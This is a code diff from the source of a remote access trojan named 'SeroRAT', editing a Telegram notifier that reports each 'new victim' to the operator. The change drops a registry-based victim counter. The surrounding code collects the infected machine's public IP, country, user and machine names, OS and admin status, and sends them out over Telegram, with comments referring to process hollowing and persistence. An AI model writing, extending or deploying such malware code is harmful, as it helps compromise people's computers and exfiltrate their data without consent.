@@ -40,32 +40,6 @@ internal static class TelegramNotifier
         return true;
     }
 
-    // Global counter key — no BuildId so it increments across all builds
-    private static readonly string _counterKey =
-        $@"SOFTWARE\Microsoft\Windows\CurrentVersion\{Config.PersistName}_tg_count";
-
-    private static int IncrementAndGetCount()
-    {
-        // Try HKLM first (machine-wide, survives user context changes from hollowing)
-        // Fall back to HKCU if not admin
-        RegistryKey? k = null;
-        try { k = Registry.LocalMachine.CreateSubKey(_counterKey); } catch { }
-        if (k == null)
-            try { k = Registry.CurrentUser.CreateSubKey(_counterKey); } catch { }
-        try
-        {
-            if (k == null) return 1;
-            using (k)
-            {
-                int current = int.TryParse(k.GetValue("n")?.ToString(), out int n) ? n : 0;
-                int next = current + 1;
-                k.SetValue("n", next.ToString());
-                return next;
-            }
-        }
-        catch { return 1; }
-    }
-
     private static void MarkNotified()
     {
         // Write to HKLM first (machine-wide — persists across user context changes)
@@ -198,8 +172,7 @@ internal static class TelegramNotifier
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
 
                 var (pubIp, country) = await GetPublicInfoAsync(http);
-                var count = IncrementAndGetCount();
-                var msg = BuildMessage(pubIp, country, count);
+                var msg = BuildMessage(pubIp, country);
 
                 bool primarySent = false;
                 for (int attempt = 0; attempt < 3 && !primarySent; attempt++)
@@ -222,7 +195,7 @@ internal static class TelegramNotifier
         });
     }
 
-    private static string BuildMessage(string pubIp, string country, int count)
+    private static string BuildMessage(string pubIp, string country)
     {
         var prefix   = string.IsNullOrEmpty(Config.ClientIdPrefix) ? "" : $"{Config.ClientIdPrefix}-";
         var clientId = $"{prefix}{Environment.MachineName}";
@@ -232,7 +205,7 @@ internal static class TelegramNotifier
         var dt       = paris.ToString("yyyy-MM-dd HH:mm") + " (Paris)";
 
         return
-            $"New victim {ToOrdinal(count)} - SeroRAT\n" +
+            $"New victim - SeroRAT\n" +
             $"\n" +
             $"ID: {clientId}\n" +
             $"User: {Environment.UserName}@{Environment.MachineName}\n" +
@@ -243,16 +216,6 @@ internal static class TelegramNotifier
             $"OS: {GetOsName()}\n" +
             $"Admin: {admin}\n" +
             $"Time: {dt}";
-    }
-
-    private static string ToOrdinal(int n)
-    {
-        string suffix = (n % 100) switch
-        {
-            11 or 12 or 13 => "th",
-            _ => (n % 10) switch { 1 => "st", 2 => "nd", 3 => "rd", _ => "th" }
-        };
-        return $"{n}{suffix}";
     }
 
     // GET request with URL-encoded plain text — no parse_mode, no markdown, no 400 errors
